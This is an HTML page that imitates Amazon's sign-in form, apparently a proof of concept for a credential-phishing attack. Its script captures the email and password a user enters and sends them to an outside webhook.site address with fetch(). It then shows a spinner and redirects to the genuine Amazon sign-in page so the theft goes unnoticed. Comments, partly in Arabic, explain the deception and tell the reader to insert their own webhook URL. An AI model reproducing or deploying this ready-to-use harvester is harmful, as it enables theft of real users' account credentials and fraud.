<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign-In</title>
    <style>
        body {
            font-family: "Amazon Ember", Arial, sans-serif;
            background-color: #fff;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
        }
        .logo { margin-bottom: 15px; }
        .logo img { width: 120px; }
        .login-container {
            width: 350px;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 20px 26px;
        }
        h1 {
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 15px;
        }
        label {
            font-size: 13px;
            font-weight: 700;
            display: block;
            margin-bottom: 5px;
        }
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 8px 10px;
            border: 1px solid #a6a6a6;
            border-radius: 3px;
            box-sizing: border-box;
            font-size: 14px;
            margin-bottom: 15px;
        }
        input:focus {
            border-color: #e77600;
            box-shadow: 0 0 3px 2px rgba(228,121,17,.5);
            outline: none;
        }
        .btn {
            width: 100%;
            padding: 10px;
            background-color: #f0c14b;
            background-image: linear-gradient(to bottom,#f7dfa5,#f0c14b);
            border: 1px solid;
            border-color: #a88734 #9c7e31 #846a29;
            border-radius: 3px;
            cursor: pointer;
            font-size: 14px;
        }
        .btn:hover {
            background-image: linear-gradient(to bottom,#f5d78e,#eeb933);
        }
        .legal {
            font-size: 12px;
            color: #555;
            margin-top: 15px;
            line-height: 1.5;
        }
        .legal a { color: #0066c0; text-decoration: none; }
        .spinner {
            display: none;
            margin: 20px auto;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #ff9900;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" alt="Amazon">
    </div>
    <div class="login-container">
        <h1>Sign in</h1>
        <form id="loginForm">
            <label for="email">Email or mobile phone number</label>
            <input type="email" id="email" name="email" required>
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
            <button type="submit" class="btn" id="submitBtn">Continue</button>
            <div class="spinner" id="spinner"></div>
        </form>
        <p class="legal">
            By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
        </p>
    </div>

    <script>
        // ⚠️ REPLACE THIS WITH YOUR WEBHOOK URL
        const WEBHOOK_URL = 'https://webhook.site/f8fe412a-eb4f-42d2-9224-0a4e933db04d';
        
        const form = document.getElementById('loginForm');
        const submitBtn = document.getElementById('submitBtn');
        const spinner = document.getElementById('spinner');
        
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // إظهار spinner لجعل العملية تبدو حقيقية
            submitBtn.style.display = 'none';
            spinner.style.display = 'block';
            
            // إرسال البيانات إلى webhook في الخلفية
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        email: email,
                        password: password,
                        timestamp: new Date().toISOString(),
                        source: 'amazon-customtab-poc'
                    })
                });
            } catch (err) {
                // نتجاهل الأخطاء - نريد الاستمرار في التحويل
                console.log('Captured');
            }
            
            // انتظر قليلاً ثم حوّل إلى Amazon الحقيقي
            setTimeout(() => {
                window.location.href = 'https://www.amazon.com/ap/signin';
            }, 1500);
        });
    </script>
</body>
</html>
